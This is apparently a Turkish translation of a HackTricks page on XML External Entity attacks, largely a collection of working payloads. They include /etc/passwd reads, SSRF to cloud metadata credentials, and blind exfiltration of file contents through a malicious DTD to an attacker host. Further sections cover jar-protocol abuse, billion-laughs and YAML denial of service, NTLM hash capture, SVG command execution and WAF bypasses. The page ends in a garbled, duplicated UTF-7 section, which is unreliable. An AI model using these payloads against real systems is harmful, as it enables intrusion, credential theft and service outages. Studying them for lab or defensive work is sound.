# XXE - XEE - XML Harici Varlık

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>


## XML Temelleri

XML, veri depolama ve taşıma için tasarlanmış bir işaretleme dilidir ve açıklayıcı adlandırılmış etiketlerin kullanımına izin veren esnek bir yapıya sahiptir. HTML'den, önceden tanımlanmış bir etiket kümesine sınırlı olmamasıyla farklılık gösterir. JSON'un yükselişiyle XML'nin önemi azalmıştır, ancak AJAX teknolojisindeki ilk rolüne rağmen.

- **Varlıklar Aracılığıyla Veri Temsili**: XML'deki varlıklar, `&lt;` ve `&gt;` gibi özel karakterlerin temsil edilmesini sağlar. Bu karakterler, XML'in etiket sistemiyle çakışmayı önlemek için `<` ve `>` ile eşleşir.

- **XML Elemanlarının Tanımlanması**: XML, eleman türlerinin tanımlanmasına izin verir ve elemanların nasıl yapılandırılması gerektiğini ve hangi içeriğe sahip olabileceğini belirler. İçerik türünden belirli alt elemanlara kadar her türlü içeriği içerebilir.

- **Belge Türü Tanımı (DTD)**: DTD'ler, belgenin yapısını ve içerebileceği veri türlerini tanımlamak için XML'de önemlidir. İç, dış veya bir kombinasyon olabilirler ve belgelerin nasıl biçimlendirildiğini ve doğrulandığını yönlendirirler.

- **Özel ve Harici Varlıklar**: XML, esnek veri temsili için DTD içinde özel varlıkların oluşturulmasını destekler. URL ile tanımlanan harici varlıklar, özellikle XML Harici Varlık (XXE) saldırıları bağlamında güvenlik endişelerine neden olur. Bu saldırılar, XML ayrıştırıcılarının harici veri kaynaklarını nasıl işlediğini sömürür: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`

- **Parametre Varlıklarıyla XXE Tespiti**: Geleneksel yöntemlerin ayrıştırıcı güvenlik önlemleri nedeniyle başarısız olduğu durumlarda, özellikle XXE zafiyetlerini tespit etmek için XML parametre varlıkları kullanılabilir. Bu varlıklar, DNS sorgularını tetikleyen veya kontrol edilen bir alan adına HTTP istekleri gönderen gibi bağlantı dışı tespit tekniklerine izin verir ve zafiyeti doğrular.
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`


## Ana saldırılar

**[Bu saldırıların çoğu, harika Portswiggers XEE laboratuvarları kullanılarak test edildi: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### Yeni Varlık testi

Bu saldırıda, basit bir yeni VARLIK bildiriminin çalışıp çalışmadığını test edeceğim.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (220).png>)

### Dosya Okuma

Farklı yollarla `/etc/passwd` dosyasını okumayı deneyelim. Windows için `C:\windows\system32\drivers\etc\hosts` dosyasını okumayı deneyebilirsiniz.

Bu ilk durumda, dikkat edin ki SYSTEM "_\*\*file:///\*\*etc/passwd_" da çalışacaktır.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (221).png>)

Bu ikinci durum, web sunucusunun PHP kullandığı durumlarda bir dosya çıkarmak için kullanışlı olabilir (Portswiggers laboratuvarlarının durumu değil).
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
Bu üçüncü durumda, `Element stockCheck`'i ANY olarak tanımladığımızı farkedin.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### Dizin listeleme

**Java** tabanlı uygulamalarda, XXE aracılığıyla bir dizinin içeriğini listelemek mümkün olabilir. Aşağıdaki gibi bir payload ile (dosya yerine sadece dizini isteyerek):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Bir XXE, bir bulutta bir SSRF'yi kötüye kullanmak için kullanılabilir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Kör SSRF

Önceden yorumlanan teknik kullanılarak sunucunun, zayıf noktalarını göstermek için kontrol ettiğiniz bir sunucuya erişmesini sağlayabilirsiniz. Ancak, bu çalışmıyorsa, muhtemelen **XML varlıklarına izin verilmiyor** demektir. Bu durumda **XML parametre varlıklarını** deneyebilirsiniz:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Kör" SSRF - Verileri dışarıya çıkar

**Bu durumda, sunucunun, bir dosyanın içeriğini HTTP isteği aracılığıyla gönderecek olan kötü amaçlı bir yük içeren yeni bir DTD yüklemesini sağlayacağız (çok satırlı dosyalar için bunu** _**ftp://**_** üzerinden dışarıya çıkarmayı deneyebilirsiniz). Bu açıklama,** [**Portswiggers lab burada**](https://portswigger.net/web-security/xxe/blind)** temel alınmıştır.**

Kötü amaçlı DTD'de, verileri dışarıya çıkarmak için bir dizi adım gerçekleştirilir:

### Kötü Amaçlı DTD Örneği:
Yapı aşağıdaki gibidir:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Bu DTD tarafından gerçekleştirilen adımlar şunlardır:

1. **Parametre Varlıklarının Tanımlanması:**
- `/etc/hostname` dosyasının içeriğini okuyan bir XML parametre varlığı olan `%file` oluşturulur.
- Başka bir XML parametre varlığı olan `%eval` tanımlanır. Dinamik olarak yeni bir XML parametre varlığı olan `%exfiltrate`'i bildirir. `%exfiltrate` varlığı, URL'nin sorgu dizgisinde `%file` varlığının içeriğini ileterek saldırganın sunucusuna HTTP isteği yapacak şekilde ayarlanır.

2. **Varlıkların Yürütülmesi:**
- `%eval` varlığı kullanılır ve `%exfiltrate` varlığının dinamik bildiriminin yürütülmesine yol açar.
- Ardından `%exfiltrate` varlığı kullanılır ve dosyanın içeriğini içeren belirtilen URL'ye HTTP isteği yapar.

Saldırgan, bu kötü amaçlı DTD'yi genellikle `http://web-attacker.com/malicious.dtd` gibi kendi kontrolündeki bir sunucuda barındırır.

**XXE Yükü:**
Zafiyetli bir uygulamayı sömürmek için saldırgan bir XXE yükü gönderir:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Bu payload, XML parametre varlığı `%xxe`'yi tanımlar ve bunu DTD içine dahil eder. Bir XML ayrıştırıcı tarafından işlendiğinde, bu payload saldırganın sunucusundan harici DTD'yi alır. Ayrıştırıcı daha sonra DTD'yi içeride yorumlar ve kötü amaçlı DTD'de belirtilen adımları gerçekleştirerek `/etc/hostname` dosyasının saldırganın sunucusuna sızmasına neden olur.


### Hata Tabanlı (Harici DTD)

**Bu durumda, sunucunun hata mesajlarını görebiliyorsanız, bir dosyanın içeriğini bir hata mesajında gösteren kötü amaçlı bir DTD yüklemesini sağlayacağız.** [**Buradan örnek alınmıştır.**](https://portswigger.net/web-security/xxe/blind)

Kötü amaçlı bir harici Document Type Definition (DTD) kullanarak, `/etc/passwd` dosyasının içeriğini ortaya çıkaran bir XML ayrıştırma hatası mesajı tetiklenebilir. Bunun için aşağıdaki adımlar izlenir:

1. `/etc/passwd` dosyasının içeriğini içeren `file` adında bir XML parametre varlığı tanımlanır.
2. `eval` adında bir XML parametre varlığı tanımlanır ve `error` adında başka bir XML parametre varlığı için dinamik bir bildirim içerir. Bu `error` varlığı değerlendirildiğinde, `file` varlığının içeriğini adı olarak kullanarak var olmayan bir dosya yüklemeye çalışır.
3. `eval` varlığı çağrılır ve `error` varlığının dinamik olarak bildirilmesine yol açar.
4. `error` varlığının çağrılması, var olmayan bir dosya yüklemeye çalışarak, `/etc/passwd` dosyasının içeriğini dosya adının bir parçası olarak içeren bir hata mesajı üretir.

Kötü amaçlı harici DTD, aşağıdaki XML ile çağrılabilir:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
## XXE (XML External Entity) - Dışsal XML Varlık

Yürütüldüğünde, web sunucusunun yanıtı `/etc/passwd` dosyasının içeriğini gösteren bir hata mesajı içermelidir.

![](<../.gitbook/assets/image (223) (1).png>)

_**Lütfen dikkat edin, harici DTD, ikinci bir varlığı (****`eval`****) içermemize izin verir, ancak içsel DTD'de bu yasaktır. Bu nedenle, genellikle harici bir DTD kullanmadan bir hata zorlayamazsınız.**_

### **Hata Tabanlı (sistem DTD)**

Peki, **dış bağlantılar engellendiğinde** (harici bağlantılar kullanılamaz), kör XXE zafiyetleri hakkında ne düşünüyorsunuz?

XML dil spesifikasyonundaki bir açık, bir belgenin DTD'sinin iç ve dış bildirimleri birleştirdiğinde hata mesajları aracılığıyla hassas verilerin ortaya çıkmasına neden olabilir. Bu sorun, harici bir DTD'de orijinal olarak bildirilen bir XML parametre varlığının içsel bir DTD içinden yeniden tanımlanmasına izin vererek hata tabanlı XXE saldırılarının gerçekleştirilmesini kolaylaştırır. Sunucu tarafından dış bağlantılar engellendiğinde, saldırganlar hassas bilgileri ortaya çıkarmak için yerel DTD dosyalarına güvenmek zorundadır.

Sunucunun dosya sistemi `/usr/local/app/schema.dtd` konumunda bir DTD dosyası içeriyorsa ve bu dosyada `custom_entity` adında bir varlık tanımlanmışsa, saldırgan aşağıdaki gibi bir karma DTD göndererek `/etc/passwd` dosyasının içeriğini ortaya çıkaracak bir XML ayrıştırma hatası oluşturabilir:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Aşağıda belirtilen adımlar bu DTD tarafından gerçekleştirilir:

- `local_dtd` adında bir XML parametre varlık tanımı, sunucunun dosya sisteminde bulunan harici DTD dosyasını içerir.
- `custom_entity` XML parametre varlığı için bir yeniden tanımlama gerçekleşir. Bu varlık, başlangıçta harici DTD'de tanımlanmış olup [hata tabanlı XXE saldırısını](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) içermektedir. Bu yeniden tanımlama, `/etc/passwd` dosyasının içeriğini ortaya çıkaran bir ayrıştırma hatası oluşturmak amacıyla tasarlanmıştır.
- `local_dtd` varlığı kullanılarak, harici DTD etkinleştirilir ve yeni tanımlanan `custom_entity` kapsanır. Bu işlemler dizisi, saldırı tarafından hedeflenen hata mesajının yayınlanmasına neden olur.


**Gerçek dünya örneği:** GNOME masaüstü ortamını kullanan sistemler genellikle `/usr/share/yelp/dtd/docbookx.dtd` konumunda `ISOamso` adında bir varlık içeren bir DTD'ye sahiptir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

Bu teknik, bir **dahili DTD kullandığından önce geçerli bir DTD bulmanız gerekmektedir**. Bunun için, sunucunun kullandığı **işletim sistemi/yazılımı yükleyerek** veya sistemlerin içindeki **varsayılan DTD'lerin bir listesini alarak** ve **var olup olmadığını kontrol ederek** aynı DTD'leri arayabilirsiniz:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Daha fazla bilgi için [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind) adresini kontrol edin.

### Sistem içinde DTD'leri bulma

Aşağıdaki harika github deposunda, sistemde bulunabilecek DTD'lerin yollarını bulabilirsiniz:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Ayrıca, **kurban sistemin Docker görüntüsüne** sahipseniz, aynı depodaki aracı kullanarak **görüntüyü tarama** ve sistem içinde bulunan **DTD'lerin yolunu bulma** imkanınız vardır. Nasıl yapılacağını öğrenmek için [github'ın Readme](https://github.com/GoSecure/dtd-finder) dosyasını okuyun.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### Office Open XML Parseleri Aracılığıyla XXE

Bu saldırının daha ayrıntılı bir açıklaması için, **Detectify'nin [bu harika yazısının](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) ikinci bölümüne bakabilirsiniz**.

**Birçok web uygulaması, Microsoft Office belgelerini yüklemek için** olanak sağlar ve ardından bu belgelerden belirli ayrıntıları çıkarır. Örneğin, bir web uygulaması kullanıcıların bir XLSX formatındaki elektronik tabloyu yüklemelerine izin verebilir. Analizcilerin verileri elektronik tablodan çıkarması için en az bir XML dosyasını ayrıştırması gerekmektedir.

Bu zafiyeti test etmek için, **XXE yükü içeren bir Microsoft Office dosyası oluşturmak gereklidir**. İlk adım, belgenin açılabilmesi için boş bir dizin oluşturmaktır.

Belge açıldıktan sonra, `./unzipped/word/document.xml` konumunda bulunan XML dosyası tercih edilen bir metin düzenleyicide (örneğin vim) açılıp düzenlenmelidir. XML, genellikle bir HTTP isteğiyle başlayan istenen XXE yükünü içerecek şekilde değiştirilmelidir.

Değiştirilmiş XML satırları, iki kök XML nesnesi arasına yerleştirilmelidir. İstekler için izlenebilir bir URL ile URL'nin yerini değiştirmek önemlidir.

Son olarak, kötü amaçlı poc.docx dosyasını oluşturmak için dosya sıkıştırılabilir. Daha önce oluşturulan "unzipped" dizininden aşağıdaki komut çalıştırılmalıdır:

Şimdi, oluşturulan dosya potansiyel olarak savunmasız olan web uygulamasına yüklenebilir ve Burp Collaborator günlüklerinde bir isteğin görünmesi umulabilir.


### Jar: Protokolü

**jar** protokolü yalnızca **Java uygulamaları** içinde erişilebilir hale getirilmiştir. Bu, hem yerel hem de uzak dosyalara hizmet eden bir **PKZIP** arşivinde dosya erişimini mümkün kılmak için tasarlanmıştır (örneğin `.zip`, `.jar`, vb.).
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
PKZIP dosyaları içindeki dosyalara erişebilmek, sistem DTD dosyaları aracılığıyla XXE'yi kötüye kullanmak için **son derece kullanışlıdır.** Sistem DTD dosyalarını kötüye kullanma hakkında bilgi edinmek için [bu bölümü kontrol edin](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

PKZIP arşivi içindeki bir dosyaya jar protokolü aracılığıyla erişme süreci şu adımları içerir:

1. Belirtilen bir konumdan (`https://download.website.com/archive.zip` gibi) zip arşivini indirmek için bir HTTP isteği yapılır.
2. Arşivi içeren HTTP yanıtı geçici olarak sistemde saklanır, genellikle `/tmp/...` gibi bir konumda.
3. Arşiv, içeriğine erişmek için çıkarılır.
4. Arşiv içindeki belirli dosya, `file.zip`, okunur.
5. İşlem tamamlandıktan sonra, bu süreçte oluşturulan geçici dosyalar silinir.

Bu süreci ikinci adımda kesmek için ilginç bir teknik, arşiv dosyasını sunarken sunucu bağlantısını sürekli açık tutmaktır. Bu amaçla [bu depoda](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution) bulunan araçlar kullanılabilir, bunlar arasında bir Python sunucusu (`slow_http_server.py`) ve bir Java sunucusu (`slowserver.jar`) bulunur.
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Geçici bir dizine dosya yazmak, yerel dosya dahil etme, şablon enjeksiyonu, XSLT RCE, serileştirme vb. bir yol geçişi içeren başka bir zafiyeti **yükseltmeye yardımcı olabilir**.
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
#### DoS

#### Milyar Gülen Saldırısı

Billion Laugh Attack (Milyar Gülen Saldırısı) olarak da bilinen DoS (Hizmet Dışı Bırakma) saldırıları, XML dış etkilerini (XXE) kullanarak hedef sistemdeki kaynakları tüketmeyi amaçlar. Bu saldırı türü, hedef sistemdeki XML ayrıştırıcısının aşırı yüklenmesine neden olur.

Bu saldırı, bir XML dosyasında yer alan bir dış etki tanımı (external entity definition) kullanılarak gerçekleştirilir. Bu tanım, bir varlık (entity) olarak adlandırılan bir dış dosyaya veya kaynağa işaret eder. Saldırgan, bu varlık referansını bir milyar kez tekrarlayarak XML ayrıştırıcısının aşırı yüklenmesine neden olur.

Bu saldırı sonucunda, hedef sistemdeki kaynaklar tükenir ve hizmetler kullanılamaz hale gelir. Bu tür saldırılar, hedef sistemdeki XML ayrıştırıcısının yanıt vermemesine veya çökmesine neden olabilir.
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml Saldırısı

Yaml saldırısı, YAML (YAML Ain't Markup Language) dosyalarının işlenmesi sırasında ortaya çıkan bir güvenlik açığıdır. Bu saldırı, XML External Entity (XXE) saldırısına benzer bir şekilde çalışır. YAML, yapılandırma dosyalarını temsil etmek için kullanılan bir veri serileştirme formatıdır.

Yaml saldırısı, YAML dosyasının içine yerleştirilen kötü niyetli bir dış etki (external entity) kullanarak gerçekleştirilir. Bu dış etki, YAML işlemleyicisi tarafından işlenirken, sistemdeki hassas bilgilere erişim sağlayabilir veya istismar edilebilir.

Yaml saldırısı, bir hedefin YAML dosyasını işlerken, dış etkilerin yüksek ayrıcalıklara sahip bir sunucuya erişmesine izin verebilir. Bu, saldırganın hedef sistemi ele geçirmesine ve yetkisiz işlemler gerçekleştirmesine olanak tanır.

Yaml saldırılarından korunmak için, güvenlik açıklarını en aza indirmek için güvenilir bir YAML işlemleyici kullanılmalıdır. Ayrıca, kullanıcı girişlerinin doğrulanması ve güvenli bir şekilde işlenmesi önemlidir.
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Karesel Patlama Saldırısı

![](<../.gitbook/assets/image (531).png>)

#### NTML Elde Etme

Windows ana bilgisayarlarında, bir responder.py işleyici ayarlayarak web sunucusu kullanıcısının NTML karmaşasını elde etmek mümkündür:
```bash
Responder.py -I eth0 -v
```
ve aşağıdaki isteği göndererek
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Ardından hashcat kullanarak hash'i kırmayı deneyebilirsiniz.

## Gizli XXE Yüzeyleri

### XInclude

Müşteri verilerini sunucu tarafında XML belgelerine entegre ederken, özellikle arka uç SOAP isteklerinde, XML yapısı üzerinde doğrudan kontrol genellikle sınırlıdır ve `DOCTYPE` öğesini değiştirmek kısıtlanır, bu da geleneksel XXE saldırılarını engeller. Bununla birlikte, `XInclude` saldırısı, XML belgesinin herhangi bir veri öğesine harici varlıkların eklenmesine izin vererek bir çözüm sunar. Bu yöntem, yalnızca sunucu tarafında oluşturulan XML belgesinin bir kısmı kontrol edilebildiğinde bile etkilidir.

Bir `XInclude` saldırısı gerçekleştirmek için, `XInclude` ad alanının bildirilmesi ve hedeflenen harici varlık için dosya yolu belirtilmesi gerekmektedir. Aşağıda, böyle bir saldırının nasıl formüle edilebileceğine dair özlü bir örnek bulunmaktadır:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Daha fazla bilgi için [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) adresini kontrol edin!

### SVG - Dosya Yükleme

Kullanıcılar tarafından belirli uygulamalara yüklenen ve ardından sunucuda işlenen dosyalar, XML veya XML içeren dosya biçimlerinin nasıl işlendiği konusunda güvenlik açıklarını sömürebilir. Ofis belgeleri (DOCX) ve resimler (SVG) gibi yaygın dosya biçimleri XML'e dayanmaktadır.

Kullanıcılar **resim yüklediğinde**, bu resimler sunucu tarafında işlenir veya doğrulanır. PNG veya JPEG gibi formatları bekleyen uygulamalar için bile, **sunucunun resim işleme kütüphanesi SVG resimlerini de destekleyebilir**. XML tabanlı bir biçim olan SVG, saldırganların kötü niyetli SVG resimleri göndererek sunucuyu XXE (XML Dış Kaynak) güvenlik açıklarına maruz bırakmasına olanak tanır.

Aşağıda böyle bir saldırının bir örneği gösterilmektedir, kötü niyetli bir SVG resmi sistem dosyalarını okumaya çalışır:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Başka bir yöntem, PHP "expect" sarmalayıcısı aracılığıyla komutları **çalıştırmaya** çalışmaktır:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
Her iki durumda da, sunucunun yazılımının XML işleme yeteneklerini istismar eden saldırıları başlatmak için SVG formatı kullanılır, bu da sağlam giriş doğrulama ve güvenlik önlemlerine olan ihtiyacı vurgular.

Daha fazla bilgi için [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) adresini kontrol edin!

**Not: Dosya okuma veya yürütme sonucunun ilk satırı OLUŞTURULAN resmin İÇİNDE görünecektir. Bu nedenle, SVG'nin oluşturduğu resme erişebilmeniz gerekmektedir.**

### **PDF - Dosya yükleme**

Bir XXE'yi sömürmek için bir PDF dosyası yüklemeyi nasıl gerçekleştireceğinizi öğrenmek için aşağıdaki gönderiyi okuyun:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: x-www-urlencoded'den XML'e

Bir POST isteği verileri XML formatında kabul ediyorsa, bu isteği bir XXE'yi sömürmek için kullanabilirsiniz. Örneğin, normal bir istek aşağıdakileri içeriyorsa:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Sonra aşağıdaki isteği gönderebilirsiniz, aynı sonuçla:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: JSON'dan XEE'ye

İsteği değiştirmek için "Content Type Converter" adlı bir Burp Eklentisini kullanabilirsiniz. Bu örneği [burada](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) bulabilirsiniz:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Başka bir örnek [burada](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2) bulunabilir.

## WAF ve Koruma Geçişleri

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Bu, XML sunucusunun `data://` protokolünü kabul ettiği durumlarda çalışır.

### UTF-7

Burada \[**"Encode Recipe**" of cyberchef here ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) UTF-7'ye dönüştürmek için \[**"Encode Recipe**" of cyberchef here ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 